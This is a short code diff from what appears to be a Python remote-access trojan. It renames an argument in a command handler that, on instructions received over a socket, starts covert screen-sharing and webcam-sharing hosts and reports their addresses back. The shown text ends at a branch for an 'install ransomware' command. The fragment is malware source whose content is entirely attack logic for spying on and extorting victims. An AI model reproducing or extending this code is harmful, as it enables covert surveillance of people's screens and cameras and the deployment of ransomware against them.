@@ -22,11 +22,11 @@ def getCommand():
 
 def processCommand(command):
     if command == WATCH_SCREEN_COMMAND:
-        threading.Thread(target=screenSharingHost.main, kwargs={'ip' : SCREEN_SHARING_IP, 'port' : SCREEN_SHARING_PORT, 'closeAfterNConnection' : True}).start()
+        threading.Thread(target=screenSharingHost.main, kwargs={'ip' : SCREEN_SHARING_IP, 'port' : SCREEN_SHARING_PORT, 'only_one_connection' : True}).start()
         soc.send(f"{SCREEN_SHARING_IP} {SCREEN_SHARING_PORT}".encode())
 
     elif command == WATCH_WEBCAM_COMMAND:
-        threading.Thread(target=webCamSharingHost.main, kwargs= {'ip' : WEB_CAM_IP, 'port' : WEB_CAM_PORT, 'closeAfterNConnection' : True}).start()
+        threading.Thread(target=webCamSharingHost.main, kwargs= {'ip' : WEB_CAM_IP, 'port' : WEB_CAM_PORT, 'only_one_connection' : True}).start()
         soc.send(f"{WEB_CAM_IP} {WEB_CAM_PORT}".encode())
 
     elif command == INSTALL_RANSOMWARE_COMMAND:
